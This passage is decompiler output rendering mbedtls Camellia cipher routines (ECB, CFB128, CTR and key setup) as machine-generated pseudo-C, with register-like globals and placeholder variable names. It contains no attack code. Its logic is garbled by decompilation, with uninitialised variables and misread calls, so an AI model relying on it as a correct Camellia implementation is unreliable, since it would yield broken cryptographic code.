    int32_t v1 = (int32_t)a1;
    g1 = v1;
    if (a1 == NULL) {
        // 0x806e91a
        return;
    }
    // 0x806e90a
    g6 = v1 + 276;
    *(char *)v1 = 0;
    int32_t v2 = g1 + 1; // 0x806e913
    g1 = v2;
    // branch -> 0x806e910
    while (v2 != g6) {
        // 0x806e910
        *(char *)v2 = 0;
        v2 = g1 + 1;
        g1 = v2;
        // continue -> 0x806e910
    }
    // 0x806e91a
    // branch -> 0x806e91a
}

// Address range: 0x806e920 - 0x806eb2f
int32_t mbedtls_camellia_crypt_ecb(int32_t * a1, int32_t a2, char * a3) {
    // 0x806e920
    int32_t v1;
    char v2 = v1; // bp-32
    int32_t v3 = (int32_t)a1;
    int32_t v4 = g5; // 0x806e923
    int32_t v5 = g7; // 0x806e924
    int32_t v6 = g3; // 0x806e925
    int32_t v7 = (int32_t)a3;
    int32_t v8 = *a1; // bp-44
    unsigned char v9 = *a3; // 0x806e934
    unsigned char v10 = *(char *)(v7 + 3); // 0x806e937
    unsigned char v11 = *(char *)(v7 + 4); // 0x806e93b
    unsigned char v12 = *(char *)(v7 + 9); // 0x806e93f
    unsigned char v13 = *(char *)(v7 + 1); // 0x806e94c
    unsigned char v14 = *(char *)(v7 + 2); // 0x806e95e
    unsigned char v15 = *(char *)(v7 + 5); // 0x806e967
    unsigned char v16 = *(char *)(v7 + 7); // 0x806e970
    unsigned char v17 = *(char *)(v7 + 6); // 0x806e976
    unsigned char v18 = *(char *)(v7 + 8); // 0x806e97f
    unsigned char v19 = *(char *)(v7 + 11); // 0x806e988
    unsigned char v20 = *(char *)(v7 + 10); // 0x806e98e
    unsigned char v21 = *(char *)(v7 + 15); // 0x806e9a0
    int32_t v22 = v3 + 4; // 0x806e9b2
    int32_t v23 = *(int32_t *)v22; // 0x806e9b2
    char v24 = v23 ^ (256 * (int32_t)v14 | 0x10000 * (int32_t)v13 | (int32_t)v10 | 0x1000000 * (int32_t)v9);
    v2 = v24;
    int32_t v25 = *(int32_t *)(v3 + 8); // 0x806e9b8
    char v26 = v25 ^ (256 * (int32_t)v17 | 0x10000 * (int32_t)v15 | 0x1000000 * (int32_t)v11 | (int32_t)v16);
    int32_t v27 = *(int32_t *)(v3 + 12); // 0x806e9be
    int32_t v28 = v27 ^ (256 * (int32_t)v20 | 0x1000000 * (int32_t)v18 | 0x10000 * (int32_t)v12 | (int32_t)v19); // 0x806e9be
    int32_t v29 = v28;
    char v30 = (char)(*(int32_t *)(v3 + 16) ^ (int32_t)v21);
    int32_t v31 = v3 + 20; // 0x806e9c7
    int32_t v32; // eax
    int32_t v33; // ecx
    int32_t v34;
    int32_t v35;
    int32_t v36;
    int32_t v37;
    int32_t v38;
    uint32_t v39; // 0x806ead4
    int32_t v40; // 0x806ea57
    int32_t v41; // 0x806ea5c
    if (v8 == 0) {
        v35 = v31;
        // 0x806ea51
        v40 = *(int32_t *)v35 ^ v28;
        v32 = v40;
        v41 = *(int32_t *)(v35 + 8);
        v2 = v41 ^ (int32_t)v24;
        v33 = v34;
        *(char *)v34 = (char)(v40 / 0x1000000);
        *(char *)(v33 + 1) = (char)(v32 / 0x10000);
        *(char *)(v33 + 2) = (char)(v32 / 256);
        *(char *)(v33 + 3) = (char)v32;
        v36 = 0x1000000 * (*(int32_t *)(v35 + 4) ^ (int32_t)v30) / 0x1000000;
        v32 = v36;
        *(char *)(v33 + 4) = (char)(v36 / 0x1000000);
        *(char *)(v33 + 5) = (char)(v32 / 0x10000);
        *(char *)(v33 + 6) = (char)(v32 / 256);
        *(char *)(v33 + 7) = (char)v32;
        v37 = v2;
        v32 = v37;
        *(char *)(v33 + 8) = (char)(v37 / 0x1000000);
        *(char *)(v33 + 9) = (char)(v32 / 0x10000);
        *(char *)(v33 + 10) = (char)(v32 / 256);
        *(char *)(v33 + 11) = (char)v32;
        v38 = 0x1000000 * (*(int32_t *)(v35 + 12) ^ (int32_t)v26) / 0x1000000;
        v32 = v38;
        *(char *)(v33 + 12) = (char)(v38 / 0x1000000);
        *(char *)(v33 + 13) = (char)(v32 / 0x10000);
        v39 = v32;
        *(char *)(v33 + 15) = (char)v39;
        *(char *)(v33 + 14) = (char)(v39 / 256);
        g3 = v6;
        g7 = v5;
        g5 = v4;
        return 0;
    }
    // 0x806e9d7
    g3 = v31;
    int32_t v42 = &v2;
    int32_t v43 = &v29; // 0x806e9df_0
    g5 = v43;
    g7 = v42;
    int32_t v44 = v8; // 0x806ea3349
    int32_t v45 = v31; // 0x806e9ea
    // branch -> 0x806e9e8
    while (true) {
        // 0x806e9e8
        g4 = v43;
        g6 = v45;
        g1 = v42;
        int32_t v46 = v44 - 1; // 0x806e9ee
        camellia_feistel(v8, v31, v46);
        g6 = g3 + 8;
        g4 = v42;
        g1 = v43;
        camellia_feistel(v8, v31, v46);
        g6 = g3 + 16;
        g4 = v43;
        g1 = v42;
        camellia_feistel(v8, v31, v46);
        g6 = g3 + 24;
        g4 = v42;
        g1 = v43;
        camellia_feistel(v8, v31, v46);
        g6 = g3 + 32;
        g4 = v43;
        g1 = v42;
        camellia_feistel(v8, v31, v46);
        g1 = v43;
        g4 = v42;
        g6 = g3 + 40;
        camellia_feistel(v8, v31, v46);
        if (v46 == 0) {
            // 0x806ea3e
            v35 = 64 * v8 + v22;
            // branch -> 0x806ea51
            // 0x806ea51
            v40 = *(int32_t *)v35 ^ v29;
            v32 = v40;
            v41 = *(int32_t *)(v35 + 8);
            v2 = v41 ^ (int32_t)v2;
            v33 = v34;
            *(char *)v34 = (char)(v40 / 0x1000000);
            *(char *)(v33 + 1) = (char)(v32 / 0x10000);
            *(char *)(v33 + 2) = (char)(v32 / 256);
            *(char *)(v33 + 3) = (char)v32;
            v36 = 0x1000000 * (*(int32_t *)(v35 + 4) ^ (int32_t)v30) / 0x1000000;
            v32 = v36;
            *(char *)(v33 + 4) = (char)(v36 / 0x1000000);
            *(char *)(v33 + 5) = (char)(v32 / 0x10000);
            *(char *)(v33 + 6) = (char)(v32 / 256);
            *(char *)(v33 + 7) = (char)v32;
            v37 = v2;
            v32 = v37;
            *(char *)(v33 + 8) = (char)(v37 / 0x1000000);
            *(char *)(v33 + 9) = (char)(v32 / 0x10000);
            *(char *)(v33 + 10) = (char)(v32 / 256);
            *(char *)(v33 + 11) = (char)v32;
            v38 = 0x1000000 * (*(int32_t *)(v35 + 12) ^ (int32_t)v26) / 0x1000000;
            v32 = v38;
            *(char *)(v33 + 12) = (char)(v38 / 0x1000000);
            *(char *)(v33 + 13) = (char)(v32 / 0x10000);
            v39 = v32;
            *(char *)(v33 + 15) = (char)v39;
            *(char *)(v33 + 14) = (char)(v39 / 256);
            g3 = v6;
            g7 = v5;
            g5 = v4;
            return 0;
        }
        int32_t v47 = g3; // 0x806eaf0
        int32_t v48 = v2;
        int32_t v49 = v48 & *(int32_t *)(v47 + 48); // 0x806eaf3
        int32_t v50 = (2 * v49 | (int32_t)(v49 < 0)) ^ (int32_t)v26; // 0x806eaf9
        v2 = (char)((v50 | *(int32_t *)(v47 + 52)) ^ v48);
        int32_t v51 = v30;
        int32_t v52 = v29 ^ (*(int32_t *)(v47 + 60) | v51); // 0x806eb0b
        v29 = v52;
        int32_t v53 = *(int32_t *)(v47 + 56) & v52; // 0x806eb11
        int32_t v54 = v47 + 64; // 0x806eb14
        g3 = v54;
        v44 = v46;
        v45 = v54;
        v30 = (2 * v53 | (int32_t)(v53 < 0)) ^ v51;
        v26 = v50;
        // branch -> 0x806e9e8
    }
}

// Address range: 0x806eb30 - 0x806ec1f
void mbedtls_camellia_crypt_cfb128(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = g5; // 0x806eb33
    int32_t v2 = g7; // 0x806eb34
    int32_t v3 = g3; // 0x806eb35
    g5 = a5;
    int32_t v4 = *a4; // 0x806eb44
    g3 = v4;
    if (a2 != 0) {
        // 0x806eb48
        g7 = 0;
        if (a3 != 0) {
            int32_t v5 = 0; // 0x806eb6f21
            // branch -> 0x806eb82
            while (true) {
                int32_t v6 = v5; // 0x806eb75
                int32_t v7 = v4; // 0x806eb63
                if (v4 == 0) {
                    // 0x806eb86
                    mbedtls_camellia_crypt_ecb((int32_t *)a1, 1, (char *)g5);
                    v6 = g7;
                    v7 = g3;
                    // branch -> 0x806eb60
                }
                int32_t v8 = g5 + v7; // 0x806eb63
                g3 = (v7 + 1) % 16;
                unsigned char v9 = *(char *)(v6 + a6) ^ *(char *)v8; // 0x806eb6f28
                *(char *)(v6 + a7) = v9;
                g7++;
                *(char *)v8 = (char)(int32_t)v9;
                int32_t v10 = g7; // 0x806eb7d
                if (v10 != a3) {
                    // 0x806eb60
                    v5 = v10;
                    v4 = g3;
                    // branch -> 0x806eb82
                    continue;
                }
                // 0x806ebb0
                g1 = 0;
                *a4 = g3;
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return;
            }
        }
        // 0x806ebb0
        g1 = 0;
        *a4 = g3;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return;
    }
    // 0x806eba8
    if (a3 != 0) {
        // 0x806ebc0
        g7 = 0;
        int32_t v11 = 0; // 0x806ebce24
        // branch -> 0x806ebee
        while (true) {
            int32_t v12 = v4; // 0x806ebd9
            int32_t v13 = v11; // 0x806ebe1
            if (v4 == 0) {
                // 0x806ebf2
                g5 = a1;
                mbedtls_camellia_crypt_ecb((int32_t *)a1, 1, (char *)a5);
                v12 = g3;
                v13 = g7;
                // branch -> 0x806ebc8
            }
            unsigned char v14 = *(char *)(v13 + a6); // 0x806ebce
            int32_t v15 = v12 + a5; // 0x806ebd7
            g3 = (v12 + 1) % 16;
            *(char *)(v13 + a7) = *(char *)v15 ^ v14;
            g7++;
            *(char *)v15 = (char)(int32_t)v14;
            int32_t v16 = g7; // 0x806ebe9
            if (v16 != a3) {
                // 0x806ebc8
                v11 = v16;
                v4 = g3;
                // branch -> 0x806ebee
                continue;
            }
            // 0x806ebb0
            g1 = 0;
            *a4 = g3;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return;
        }
    }
    // 0x806ebb0
    g1 = 0;
    *a4 = g3;
    g3 = v3;
    g7 = v2;
    g5 = v1;
}

// Address range: 0x806ec20 - 0x806ecaf
int32_t mbedtls_camellia_crypt_ctr(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = g5; // 0x806ec23
    int32_t v2 = g7; // 0x806ec24
    int32_t v3 = g3; // 0x806ec25
    g7 = a4;
    int32_t v4 = *a3; // 0x806ec37
    g3 = v4;
    if (a2 == 0) {
        // 0x806eca0
        *a3 = v4;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 0;
    }
    // 0x806ec3b
    g5 = 0;
    int32_t v5 = 0; // 0x806ec4313
    // branch -> 0x806ec5e
    int32_t v6;
    while (true) {
        int32_t v7 = v4; // 0x806ec4d
        int32_t v8 = v5; // 0x806ec53
        if (v4 == 0) {
            // 0x806ec62
            mbedtls_camellia_crypt_ecb((int32_t *)a1, 1, (char *)g7);
            char * v9 = (char *)(g7 + 15); // 0x806ec88_0
            *v9 = (char)((int32_t)*v9 + 1);
            v7 = g3;
            v8 = g5;
            // branch -> 0x806ec40
        }
        char v10 = *(char *)(v8 + a6); // 0x806ec43
        char v11 = *(char *)(a5 + v7); // 0x806ec4a
        g3 = (v7 + 1) % 16;
        *(char *)(v8 + a7) = v11 ^ v10;
        int32_t v12 = g5 + 1; // 0x806ec56
        g5 = v12;
        v6 = g3;
        if (v12 == a2) {
            // break -> 0x806eca0
            break;
        }
        v5 = v12;
        v4 = v6;
        // continue -> 0x806ec5e
    }
    // 0x806eca0
    // branch -> 0x806eca0
    // 0x806eca0
    *a3 = v6;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return 0;
}

// Address range: 0x806ecb0 - 0x806f50f
int32_t mbedtls_camellia_setkey_enc(int32_t * a1, int32_t a2, uint32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = (int32_t)a1;
    int32_t v2;
    int32_t v3 = &v2; // ebp
    int32_t v4 = g5; // 0x806ecba
    int32_t v5 = g7; // 0x806ecbb
    int32_t v6 = g3; // 0x806ecbc
    g7 = v1;
    int32_t v7;
    int32_t v8 = &v7; // ebx
    int32_t v9 = a2; // edx
    memset((char *)&v7, 0, 16);
    memset((char *)(g7 + 4), 0, 68);
    int32_t v10; // 0x806ed37
    int32_t v11; // 0x806edb5
    int32_t v12; // 0x806ee01
    int32_t v13; // 0x806ee1d
    int32_t v14; // 0x806eeb1
    int32_t v15; // 0x806f500
    int32_t v16; // 0x806ed4d_0
    int32_t * v17; // 0x806ee50_0
    int32_t * v18; // 0x806ee62_0
    int32_t * v19; // 0x806ee6e_0
    int32_t * v20; // 0x806ee7a_0
    int32_t v21; // 0x806f4eb_0
    int32_t v22; // eax
    int32_t v23; // edi
    int32_t v24;
    int32_t v25;
    int32_t v26;
    int32_t v27;
    int32_t v28;
    int32_t v29;
    int32_t set_mem;
    int32_t v30; // 0x806ee09
    int32_t v31; // 0x806ee24
    int32_t v32; // 0x806ee47
    int32_t v33; // 0x806ee56
    int32_t v34; // 0x806ee68
    int32_t v35; // 0x806ee74
    int32_t v36; // 0x806eeb8
    int32_t v37; // 0x806eedc
    int32_t v38; // 0x806eef3
    int32_t v39; // 0x806eeff
    int32_t v40; // 0x806ef0b
    int32_t v41; // 0x806ef17
    int32_t v42; // 0x806ef2b
    int32_t v43; // 0x806ef39
    int32_t v44; // 0x806efef
    unsigned char v45; // 0x806f4f8
    int32_t v46; // 0x806edd8
    int32_t v47; // 0x806edf8
    int32_t v48; // 0x806ee09
    int32_t v49; // 0x806ee1a
    int32_t v50; // 0x806ee24
    int32_t v51; // 0x806ee37
    int32_t v52; // 0x806ee87
    int32_t v53; // 0x806ee97
    int32_t v54; // 0x806eeae
    int32_t v55; // 0x806eeb8
    int32_t v56; // 0x806eebe
    int32_t v57; // 0x806ef2b
    int32_t v58; // 0x806f4fd
    int32_t v59; // 0x806ef17
    int32_t v60; // 0x806ed34
    char v61; // 0x806ed30
    int32_t v62; // 0x806ed50
    int32_t v63; // 0x806ed8a
    unsigned char v64; // 0x806edd8
    int32_t v65; // 0x806ee15
    int32_t v66; // 0x806eea9
    int32_t v67; // 0x806edf5
    int32_t v68; // 0x806edd8
    unsigned char v69; // 0x806ed50
    unsigned char v70; // 0x806ed58
    unsigned char v71; // 0x806ed68
    unsigned char v72; // 0x806ed72
    unsigned char v73; // 0x806ed7f
    unsigned char v74; // 0x806ed8a
    unsigned char v75; // 0x806ed9a
    unsigned char v76; // 0x806eda4
    unsigned char v77; // 0x806eddc
    unsigned char v78; // 0x806ede9
    unsigned char v79; // 0x806edf0
    if (a3 != 192) {
        // 0x806ecf3
        if (a3 != 256) {
            // 0x806ed00
            if (a3 != 128) {
                // 0x806ed0e
                g3 = v6;
                g7 = v5;
                g5 = v4;
                g2 = v2;
                return -36;
            }
            // 0x806ed19
            *(int32_t *)g7 = 3;
            // branch -> 0x806ed2e
            // 0x806ed2e
            v60 = 0;
            v61 = *(char *)(v9 + v60);
            *(char *)(v8 + v60) = v61;
            v10 = 1;
            // branch -> 0x806ed30
            while (16 > v10) {
                // 0x806ed30
                v60 = v10;
                v61 = *(char *)(v9 + v60);
                *(char *)(v8 + v60) = v61;
                v10++;
                // continue -> 0x806ed30
            }
            // 0x806ed3e
            if (a3 == 192) {
                // 0x806f4eb
                v21 = &v26;
                v58 = v21;
                v45 = *(char *)v58;
                *(char *)(v58 + 8) = (char)(-1 - (int32_t)v45);
                v15 = v21 + 1;
                // branch -> 0x806f4f8
                while (v15 != (int32_t)&v25) {
                    // 0x806f4f8
                    v58 = v15;
                    v45 = *(char *)v58;
                    *(char *)(v58 + 8) = (char)(-1 - (int32_t)v45);
                    v15++;
                    // continue -> 0x806f4f8
                }
                // 0x806ed4b
                v22 = 0;
                v16 = &v28;
                g6 = v16;
                int32_t v80 = v16; // 0x806ed87
                int32_t v81 = 0; // 0x806ed87
                // branch -> 0x806ed50
                while (true) {
                    // 0x806ed50
                    v62 = 8 * v81;
                    v69 = *(char *)(v62 + (int32_t)&g167);
                    v70 = *(char *)(v62 + (int32_t)&g168);
                    v71 = *(char *)(v62 + (int32_t)&g170);
                    v72 = *(char *)(v62 + (int32_t)&g169);
                    v73 = *(char *)(v62 + (int32_t)&g172);
                    *(int32_t *)(v62 + v80) = 256 * (int32_t)v72 | 0x10000 * (int32_t)v70 | 0x1000000 * (int32_t)v69 | (int32_t)v71;
                    v63 = 8 * v22;
                    v74 = *(char *)(v63 + (int32_t)&g171);
                    v75 = *(char *)(v63 + (int32_t)&g174);
                    v76 = *(char *)(v63 + (int32_t)&g173);
                    *(int32_t *)((v63 | 4) + g6) = 256 * (int32_t)v76 | 0x1000000 * (int32_t)v74 | 0x10000 * (int32_t)v73 | (int32_t)v75;
                    v11 = v22 + 1;
                    v22 = v11;
                    if (v11 == 6) {
                        int32_t v82 = 16;
                        int32_t v83 = &v24;
                        v29 = &v27;
                        // branch -> 0x806edd8
                        while (true) {
                            // 0x806edd8
                            set_mem = (int32_t)memset((char *)v29, v83, v82);
                            v46 = v8;
                            v68 = 4 * set_mem;
                            v64 = *(char *)(v68 + v46);
                            v77 = *(char *)((v68 | 1) + v46);
                            v78 = *(char *)((v68 | 3) + v46);
                            v79 = *(char *)((v68 | 2) + v46);
                            v67 = 256 * (int32_t)v79;
                            v47 = v67 | 0x10000 * (int32_t)v77 | 0x1000000 * (int32_t)v64 | (int32_t)v78;
                            *(int32_t *)(v68 - 188 + v3) = v47;
                            v12 = set_mem + 1;
                            if (v12 == 8) {
                                // 0x806ee09
                                v30 = v3;
                                v48 = v30 - 188;
                                g3 = v48;
                                v49 = v48;
                                v65 = *(int32_t *)(v49 + 16);
                                *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                                v13 = g3 + 4;
                                g3 = v13;
                                // branch -> 0x806ee15
                                while (v13 != v30 - 172) {
                                    // 0x806ee15
                                    v49 = v13;
                                    v65 = *(int32_t *)(v49 + 16);
                                    *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                                    v13 = g3 + 4;
                                    g3 = v13;
                                    // continue -> 0x806ee15
                                }
                                // 0x806ee24
                                v31 = v3;
                                v50 = v31 - 156;
                                g5 = v50;
                                g4 = v31 - 148;
                                g1 = v50;
                                camellia_feistel(v1, a2, a3);
                                v51 = g2;
                                g6 = v51 - 52;
                                g4 = g5;
                                g1 = v51 - 148;
                                camellia_feistel(v1, a2, a3);
                                v32 = g2;
                                g6 = v32 - 44;
                                v17 = (int32_t *)(v32 - 156);
                                *v17 = *v17 ^ *(int32_t *)(v32 - 188);
                                v33 = g2;
                                g4 = v33 - 148;
                                v18 = (int32_t *)(v33 - 152);
                                *v18 = *v18 ^ *(int32_t *)(v33 - 184);
                                v34 = g2;
                                v19 = (int32_t *)(v34 - 148);
                                *v19 = *v19 ^ *(int32_t *)(v34 - 180);
                                v35 = g2;
                                v20 = (int32_t *)(v35 - 144);
                                *v20 = *v20 ^ *(int32_t *)(v35 - 176);
                                g1 = g5;
                                camellia_feistel(v1, a2, a3);
                                v52 = g2;
                                g6 = v52 - 36;
                                g4 = g5;
                                g1 = v52 - 148;
                                camellia_feistel(v1, a2, a3);
                                v53 = g2;
                                v37 = v53;
                                if (*(int32_t *)(v53 + 16) >= 129) {
                                    // 0x806eea0
                                    v54 = g3;
                                    v66 = *(int32_t *)(v54 + 16);
                                    *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                                    v14 = g3 + 4;
                                    g3 = v14;
                                    // branch -> 0x806eea9
                                    while (v14 != v53 - 156) {
                                        // 0x806eea9
                                        v54 = v14;
                                        v66 = *(int32_t *)(v54 + 16);
                                        *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                                        v14 = g3 + 4;
                                        g3 = v14;
                                        // continue -> 0x806eea9
                                    }
                                    // 0x806eeb8
                                    v36 = g2;
                                    v55 = v36 - 132;
                                    g5 = v55;
                                    v56 = v36 - 140;
                                    g3 = v56;
                                    g4 = v55;
                                    g6 = v36 - 28;
                                    g1 = v56;
                                    camellia_feistel(v1, a2, a3);
                                    g6 = g2 - 20;
                                    g4 = g3;
                                    g1 = g5;
                                    camellia_feistel(v1, a2, a3);
                                    v37 = g2;
                                    // branch -> 0x806eedc
                                }
                                // 0x806eedc
                                v23 = 15;
                                *(int32_t *)(v37 - 292) = g7;
                                *(int32_t *)(g2 - 268) = *(int32_t *)(v37 - 188);
                                v38 = g2;
                                *(int32_t *)(v38 - 264) = *(int32_t *)(v38 - 184);
                                v39 = g2;
                                *(int32_t *)(v39 - 260) = *(int32_t *)(v39 - 180);
                                v40 = g2;
                                *(int32_t *)(v40 - 256) = *(int32_t *)(v40 - 176);
                                v41 = g2;
                                v59 = *(int32_t *)(v41 - 284);
                                *(int32_t *)(v41 - 272) = 16 * v59 + (int32_t)&g175;
                                v42 = g2;
                                v57 = v42 - 268;
                                v22 = v57;
                                *(int32_t *)(v42 - 296) = v57;
                                v9 = v22;
                                // branch -> 0x806ef39
                                while (true) {
                                    // 0x806ef39
                                    v43 = g2;
                                    v44 = v43;
                                    if (*(char *)*(int32_t *)(v43 - 272) != 0) {
                                      lab_0x806ef48_5:
                                        // 0x806ef48
                                        *(int32_t *)(v43 - 276) = v23 % 32;
                                        int32_t v84 = 32 - *(int32_t *)(g2 - 276); // 0x806ef64
                                        *(int32_t *)(g2 - 280) = v84;
                                        uint32_t v85 = v84 % 32; // 0x806ef70
                                        int32_t v86 = *(int32_t *)(v43 - 264); // 0x806ef70
                                        int32_t v87 = v86; // 0x806ef82
                                        if (v85 != 0) {
                                            // if_806ef70_0_true
                                            v87 = v86 >> v85;
                                            // branch -> after_if_806ef70_0
                                        }
                                        unsigned char v88 = *(char *)(g2 - 276) % 32;
                                        int32_t v89 = *(int32_t *)(v43 - 268); // 0x806ef79
                                        int32_t v90 = v89; // 0x806ef82
                                        if (v88 != 0) {
                                            // if_806ef79_0_true
                                            v90 = v89 << (int32_t)v88;
                                            // branch -> after_if_806ef79_0
                                        }
                                        // after_if_806ef79_0
                                        *(int32_t *)(v9 + 16) = v90 ^ v87;
                                        uint32_t v91 = *(int32_t *)(g2 - 260); // 0x806ef87
                                        int32_t v92 = *(int32_t *)(g2 - 264); // 0x806ef8d
                                        unsigned char v93 = *(char *)(g2 - 280) % 32;
                                        int32_t v94 = v91; // 0x806efa5
                                        if (v93 != 0) {
                                            // if_806ef93_0_true
                                            v94 = v91 >> (int32_t)v93;
                                            // branch -> after_if_806ef93_0
                                        }
                                        unsigned char v95 = *(char *)(g2 - 276) % 32;
                                        int32_t v96 = v92; // 0x806efa5
                                        if (v95 != 0) {
                                            // if_806ef9c_0_true
                                            v96 = v92 << (int32_t)v95;
                                            // branch -> after_if_806ef9c_0
                                        }
                                        // after_if_806ef9c_0
                                        *(int32_t *)(v9 + 20) = v96 ^ v94;
                                        uint32_t v97 = *(int32_t *)(g2 - 256); // 0x806efaa
                                        int32_t v98 = *(int32_t *)(g2 - 260); // 0x806efb0
                                        unsigned char v99 = *(char *)(g2 - 280) % 32;
                                        int32_t v100 = v97; // 0x806efc8
                                        if (v99 != 0) {
                                            // if_806efb6_0_true
                                            v100 = v97 >> (int32_t)v99;
                                            // branch -> after_if_806efb6_0
                                        }
                                        unsigned char v101 = *(char *)(g2 - 276) % 32;
                                        int32_t v102 = v98; // 0x806efc8
                                        if (v101 != 0) {
                                            // if_806efbf_0_true
                                            v102 = v98 << (int32_t)v101;
                                            // branch -> after_if_806efbf_0
                                        }
                                        // after_if_806efbf_0
                                        *(int32_t *)(v9 + 24) = v102 ^ v100;
                                        uint32_t v103 = *(int32_t *)(g2 - 268); // 0x806efcd
                                        int32_t v104 = *(int32_t *)(g2 - 256); // 0x806efd3
                                        unsigned char v105 = *(char *)(g2 - 280) % 32;
                                        int32_t v106 = v103; // 0x806efe4
                                        if (v105 != 0) {
                                            // if_806efd9_0_true
                                            v106 = v103 >> (int32_t)v105;
                                            // branch -> after_if_806efd9_0
                                        }
                                        unsigned char v107 = *(char *)(g2 - 276) % 32;
                                        int32_t v108 = v104; // 0x806efe4
                                        if (v107 != 0) {
                                            // if_806efe2_0_true
                                            v108 = v104 << (int32_t)v107;
                                            // branch -> after_if_806efe2_0
                                        }
                                        // after_if_806efe2_0
                                        *(int32_t *)(v9 + 28) = v108 ^ v106;
                                        v44 = g2;
                                        // branch -> 0x806efe9
                                    }
                                  lab_0x806efe9_5:
                                    // 0x806efe9
                                    v23 += 15;
                                    v9 += 16;
                                    int32_t * v109 = (int32_t *)(v44 - 272); // 0x806efef_0
                                    *v109 = *v109 + 1;
                                    if (v23 == 75) {
                                        // break -> 0x806efff
                                        break;
                                    }
                                    // continue -> 0x806ef39
                                }
                                int32_t * v110 = (int32_t *)(g2 - 284); // 0x806efff_0
                                v9 = 0;
                                int32_t v111 = *(int32_t *)(g2 - 292); // 0x806f007
                                int32_t v112 = 16 * (*v110 + 4 * *v110) + (int32_t)&g176; // 0x806f019
                                int32_t v113 = 0; // 0x806f028
                                // branch -> 0x806f020
                                while (true) {
                                    char v114 = *(char *)v112; // 0x806f020
                                    int32_t v115 = *(int32_t *)(v22 + 4 * v113); // 0x806f028
                                    *(int32_t *)(v111 + 4 + 4 * (int32_t)v114) = v115;
                                    int32_t v116 = v9 + 1; // 0x806f032
                                    v9 = v116;
                                    int32_t v117 = v112 + 1; // 0x806f035
                                    if (v116 == 20) {
                                        int32_t v118 = g2; // 0x806f1a5
                                        int32_t v119; // 0x806f1bc
                                        int32_t v120; // 0x806f1c8
                                        int32_t v121; // 0x806f1d4
                                        int32_t v122; // 0x806f1e0
                                        int32_t v123; // 0x806f1fa
                                        int32_t v124; // 0x806f2b0
                                        int32_t v125; // 0x806f1e0
                                        if (*(int32_t *)(g2 + 16) >= 129) {
                                            // 0x806f04a
                                            v23 = 15;
                                            *(int32_t *)(g2 - 292) = v111;
                                            *(int32_t *)(g2 - 268) = *(int32_t *)(g2 - 172);
                                            *(int32_t *)(g2 - 264) = *(int32_t *)(g2 - 168);
                                            *(int32_t *)(g2 - 260) = *(int32_t *)(g2 - 164);
                                            *(int32_t *)(g2 - 256) = *(int32_t *)(g2 - 160);
                                            int32_t v126 = *(int32_t *)(g2 - 284); // 0x806f085
                                            *(int32_t *)(g2 - 272) = 4 * (4 * v126 | 1) + (int32_t)&g175;
                                            v9 = v22;
                                            // branch -> 0x806f0a0
                                            while (true) {
                                                // 0x806f0a0
                                                if (*(char *)*(int32_t *)(g2 - 272) != 0) {
                                                    // 0x806f0af
                                                    *(int32_t *)(g2 - 276) = v23 % 32;
                                                    int32_t v127 = 32 - *(int32_t *)(g2 - 276); // 0x806f0cb
                                                    *(int32_t *)(g2 - 280) = v127;
                                                    uint32_t v128 = v127 % 32; // 0x806f0d7
                                                    int32_t v129 = *(int32_t *)(g2 - 264); // 0x806f0d7
                                                    int32_t v130 = v129; // 0x806f0e9
                                                    if (v128 != 0) {
                                                        // if_806f0d7_0_true
                                                        v130 = v129 >> v128;
                                                        // branch -> after_if_806f0d7_0
                                                    }
                                                    unsigned char v131 = *(char *)(g2 - 276) % 32;
                                                    int32_t v132 = *(int32_t *)(g2 - 268); // 0x806f0e0
                                                    int32_t v133 = v132; // 0x806f0e9
                                                    if (v131 != 0) {
                                                        // if_806f0e0_0_true
                                                        v133 = v132 << (int32_t)v131;
                                                        // branch -> after_if_806f0e0_0
                                                    }
                                                    // after_if_806f0e0_0
                                                    *(int32_t *)(v9 + 16) = v133 ^ v130;
                                                    uint32_t v134 = *(int32_t *)(g2 - 260); // 0x806f0ee
                                                    int32_t v135 = *(int32_t *)(g2 - 264); // 0x806f0f4
                                                    unsigned char v136 = *(char *)(g2 - 280) % 32;
                                                    int32_t v137 = v134; // 0x806f10c
                                                    if (v136 != 0) {
                                                        // if_806f0fa_0_true
                                                        v137 = v134 >> (int32_t)v136;
                                                        // branch -> after_if_806f0fa_0
                                                    }
                                                    unsigned char v138 = *(char *)(g2 - 276) % 32;
                                                    int32_t v139 = v135; // 0x806f10c
                                                    if (v138 != 0) {
                                                        // if_806f103_0_true
                                                        v139 = v135 << (int32_t)v138;
                                                        // branch -> after_if_806f103_0
                                                    }
                                                    // after_if_806f103_0
                                                    *(int32_t *)(v9 + 20) = v139 ^ v137;
                                                    uint32_t v140 = *(int32_t *)(g2 - 256); // 0x806f111
                                                    int32_t v141 = *(int32_t *)(g2 - 260); // 0x806f117
                                                    unsigned char v142 = *(char *)(g2 - 280) % 32;
                                                    int32_t v143 = v140; // 0x806f12f
                                                    if (v142 != 0) {
                                                        // if_806f11d_0_true
                                                        v143 = v140 >> (int32_t)v142;
                                                        // branch -> after_if_806f11d_0
                                                    }
                                                    unsigned char v144 = *(char *)(g2 - 276) % 32;
                                                    int32_t v145 = v141; // 0x806f12f
                                                    if (v144 != 0) {
                                                        // if_806f126_0_true
                                                        v145 = v141 << (int32_t)v144;
                                                        // branch -> after_if_806f126_0
                                                    }
                                                    // after_if_806f126_0
                                                    *(int32_t *)(v9 + 24) = v145 ^ v143;
                                                    uint32_t v146 = *(int32_t *)(g2 - 268); // 0x806f134
                                                    int32_t v147 = *(int32_t *)(g2 - 256); // 0x806f13a
                                                    unsigned char v148 = *(char *)(g2 - 280) % 32;
                                                    int32_t v149 = v146; // 0x806f14b
                                                    if (v148 != 0) {
                                                        // if_806f140_0_true
                                                        v149 = v146 >> (int32_t)v148;
                                                        // branch -> after_if_806f140_0
                                                    }
                                                    unsigned char v150 = *(char *)(g2 - 276) % 32;
